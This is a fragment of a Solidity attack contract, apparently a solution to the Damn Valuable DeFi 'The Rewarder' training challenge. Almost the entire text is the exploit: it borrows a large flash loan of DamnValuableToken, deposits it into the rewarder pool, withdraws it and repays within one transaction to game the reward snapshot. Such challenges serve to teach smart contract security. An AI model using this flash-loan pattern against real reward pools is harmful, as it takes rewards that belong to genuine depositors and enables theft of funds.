...
contract TheRewarderPoolAttack is IFlashLoanReceiver {
    TheRewarderPool public r;
    IFlashLoanerPool public f;
    AccountingToken public a;
    DamnValuableToken public d;
    ...
    function getFlashLoan() public {
        f.flashLoan(2500 * 400 * 1 ether);
    }

    function receiveFlashLoan(uint256 amount) external override {
        d.approve(address(r), amount);
        r.deposit(amount);
        r.withdraw(amount);
        require(d.transfer(address(f), amount));
    }
